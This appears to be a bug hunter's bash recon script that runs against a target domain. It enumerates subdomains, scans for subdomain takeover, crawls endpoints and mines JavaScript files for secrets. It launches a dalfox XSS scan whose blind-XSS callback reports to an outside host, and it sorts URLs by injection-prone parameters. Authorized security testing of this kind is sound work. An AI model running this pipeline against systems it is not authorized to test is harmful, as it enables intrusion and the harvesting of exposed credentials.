#finding subdomains

#cat /home/victor/Desktop/bugHunting/resources/wordlists/dns-Jhaddix.txt | subgen -d "$1" | zdns A | jq -r "select(.data.answers[0].name) | .name" | tee -a domains
# amass enum -v -src -ip -brute -min-for-recursive 2 -d $1
# amass enum -active -d owasp.org -public-dns -brute -w /root/dns_lists/deepmagic.com-top50kprefixes.txt -src -ip -dir amass4owasp -config /root/amass/config.ini -o amass_results_owasp.txt
subfinder -d $1 | tee -a domains
assetfinder -subs-only $1 | tee -a domains
crobat-client -s $1 | tee -a domains
curl -s "https://crt.sh/\?q\=%25.$1\&output\=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | tee -a domains

rapiddns(){
curl -s "https://rapiddns.io/subdomain/$1?full=1" \
 | grep -oP '_blank">\K[^<]*' \
 | grep -v http \
 | sort -u
}

rapiddns $1 | tee -a domains


#sorting/uniq
#cat subb.txt >> domains
sort -u domains > dom2;rm domains;mv dom2 domains

#screeshots
python3 /home/victor/Desktop/bugHunting/tools/webscreenshot/webscreenshot.py -i domains -w 10

#account takeover scanning
subjack -w domains -t 100 -timeout 30 -ssl -c /home/victor/go/src/github.com/haccer/subjack/fingerprints.json -v | tee -a takeover

#httprobing 
cat domains | httprobe | tee -a responsive
gf interestingsubs responsive > interestingsubs

#endpoint discovery
cat responsive | gau -subs | tee -a all_urls
cat responsive | hakrawler --depth 3 --plain | tee -a all_urls


#extracting all responsive js files
grep "\.js$" all_urls | anti-burl | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u | tee -a javascript_files
while read LINE; do 
	python3 /home/victor/Desktop/bugHunting/tools/secretfinder/SecretFinder.py -i $LINE -o cli | tee -a secretfinder_results
done < javascript_files

#xss scan
dalfox file all_urls -b "https://vict0ni.xss.ht" -o dalfox_scan

#grabing endpoints that include juicy parameters
gf redirect all_urls | anti-burl > redirects
gf idor all_urls | anti-burl > idor
gf rce all_urls | anti-burl > rce
gf lfi all_urls | anti-burl > lfi
gf ssrf all_urls | anti-burl > ssrf
